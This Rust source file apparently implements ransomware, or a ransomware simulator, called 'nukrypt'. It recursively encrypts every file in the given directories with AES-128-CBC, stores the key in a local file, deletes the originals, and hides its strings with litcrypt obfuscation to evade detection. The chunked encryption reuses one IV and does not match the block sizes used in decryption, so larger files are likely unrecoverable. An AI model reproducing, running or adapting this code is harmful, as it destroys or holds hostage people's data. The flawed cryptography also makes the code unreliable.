use std::{env, fs};
use std::fs::File;
use std::path::Path;
use std::time::Instant;
use std::io::{Read, Write, Error, ErrorKind};

use rand::{Rng};
use libaes::Cipher;
use litcrypt::{use_litcrypt, lc};


const BLOCK_SIZE: usize = 64 * 1024;

macro_rules! nukrypt_key { () => { lc!("nukrypt.key") } }
macro_rules! nukrypt_extension { () => { lc!(".nukrypt") } }
macro_rules! nukrypt_banner { () => { lc!("Usage: nukrypt [encrypt|decrypt] [dir]..") } }

use_litcrypt!("nukrypt");


fn main() {
    let key_exists: bool;
    let mut decrypt: bool = false;
    let mut key : [u8; 16] = [0u8; 16];

    let args: Vec<_> = env::args().collect();

    if args.len() < 3 {
        println!("{}", nukrypt_banner!());
        return;
    }

    match read_key(nukrypt_key!().as_str(), &mut key) {
        Ok(_)  => { key_exists = true },
        Err(_) => { key_exists = false }
    }

    if args[1].eq(lc!("decrypt").as_str()) {
        if ! key_exists {
            println!("{} {}", lc!("[!] Failed to read encryption key from"), nukrypt_key!());
            return;
        }

        decrypt = true;
    }
    else
    if args[1].eq(lc!("encrypt").as_str()) {
        if key_exists {
            println!("{} {}\n", lc!("[+] Encryption key read from"), nukrypt_key!());
        }
        else {
            key = rand::thread_rng().gen::<[u8; 16]>();

            match write_key(nukrypt_key!().as_str(), &key) {
                Ok(_)  => println!("{} {}\n", lc!("[+] Encryption key saved to"), nukrypt_key!()),
                Err(_) => {
                    println!("{} {}", lc!("[!] Failed to write encryption key to"), nukrypt_key!());
                    return;
                }
            }
        }
    }
    else {
        println!("{}", nukrypt_banner!());
        return;
    }

    for i in 2..args.len() {
        if ! Path::new(&args[i]).is_dir() {
            println!("{} {}", lc!("[!] No such directory:"), &args[i]);
            return;
        }
    }

    let mut counter : usize = 0;
    let before = Instant::now();

    for i in 2..args.len() {
        if ! Path::new(&args[i]).is_dir() {
            println!("{} {}", lc!("[!] No such directory:"), &args[i]);
            return;
        }

        if decrypt {
            counter += decrypt_dir(&args[i], &key).unwrap();
        }
        else {
            counter += encrypt_dir(&args[i], &key).unwrap();
        }
    }

    if decrypt {
        println!(
            "\n{} {} {} {:.3} {}", lc!("[+]"), counter, lc!("files decrypted in"),
            (before.elapsed().as_millis() as f32) / 1000.0, lc!("seconds")
        );
    }
    else {
        println!(
            "\n{} {} {} {:.3} {}", lc!("[+]"), counter, lc!("files encrypted in"),
            (before.elapsed().as_millis() as f32) / 1000.0, lc!("seconds")
        );
    }
}

fn read_key(path: &str, key: &mut [u8; 16]) -> Result<bool, Error> {
    let mut fin = File::open(path)?;

    if fin.read(key)? != 16 {
        return Err(Error::new(
            ErrorKind::UnexpectedEof,
            lc!("Failed to read key from file")
        ));
    }

    Ok(true)
}

fn write_key(path: &str, key: &[u8; 16]) -> Result<bool, Error> {
    let mut fout = File::create(path)?;
    fout.write(key)?;

    Ok(true)
}

fn encrypt_file(path: &str, key: &[u8; 16]) -> Result<bool, Error> {
    let path_out = format!("{}{}", path, nukrypt_extension!());

    let mut fin = File::open(path)?;
    let mut fout = File::create(&path_out)?;

    let mut buffer = [0u8; BLOCK_SIZE];

    let iv = rand::thread_rng().gen::<[u8; 16]>();
    let cipher: Cipher = Cipher::new_128(key);

    fout.write(&iv)?;

    loop {
        let n = fin.read(&mut buffer[..])?;

        if n == 0 {
            break;
        }

        let cipher_block = cipher.cbc_encrypt(&iv, &buffer[..n]);    

        if fout.write(&cipher_block)? == 0 {
            break;
        }
    }

    fs::remove_file(path)?;
    Ok(true)
}

fn decrypt_file(path: &str, key: &[u8; 16]) -> Result<bool, Error> {
    let path_out = match path.strip_suffix(nukrypt_extension!().as_str()) {
        Some(s) => s.to_owned(),
        None => path.to_string()
    };

    let mut fin = File::open(path)?;
    let mut fout = File::create(&path_out)?;

    let mut iv: [u8; 16] = [0u8; 16];
    let mut buffer = [0u8; BLOCK_SIZE];

    let cipher: Cipher = Cipher::new_128(key);

    fin.read(&mut iv[..])?;

    loop {
        let n = fin.read(&mut buffer[..])?;

        if n == 0 {
            break;
        }

        let cipher_block = cipher.cbc_decrypt(&iv, &buffer[..n]);

        if fout.write(&cipher_block)? == 0 {
            break;
        }
    }

    fs::remove_file(path)?;
    Ok(true)
}

fn encrypt_dir(path: &str, key: &[u8; 16]) -> Result<usize, Error> {
    let mut counter: usize = 0;

    for e in fs::read_dir(path).unwrap() {
        let entry = e.unwrap();
        let filetype = entry.file_type().unwrap();

        if filetype.is_file() {
            println!("{} {}", lc!("[#] Encrypting:"), entry.path().display());

            match encrypt_file(entry.path().to_str().unwrap(), &key) {
                Ok(b)  => { if b { counter += 1 } },
                Err(e) => {
                    println!("{} {}", lc!("[-] Failed:"), e)
                }
            }
        }
        else
        if filetype.is_dir() {
            counter += encrypt_dir(entry.path().to_str().unwrap(), key).unwrap();
        }
    }

    Ok(counter)
}

fn decrypt_dir(path: &str, key: &[u8; 16]) -> Result<usize, Error> {
    let mut counter: usize = 0;

    for e in fs::read_dir(path).unwrap() {
        let entry = e.unwrap();
        let filetype = entry.file_type().unwrap();

        if filetype.is_file() {
            if ! entry.file_name().to_str().unwrap().ends_with(nukrypt_extension!().as_str()) {
                continue;
            }

            println!("{} {}", lc!("[#] Decrypting:"), entry.path().display());
    
            match decrypt_file(entry.path().to_str().unwrap(), &key) {
                Ok(b)  => { if b { counter += 1 } },
                Err(e) => {
                    println!("{} {}", lc!("[-] Failed:"), e)
                }
            }
        }
        else
        if filetype.is_dir() {
            counter += decrypt_dir(entry.path().to_str().unwrap(), key).unwrap();
        }
    }

    Ok(counter)
}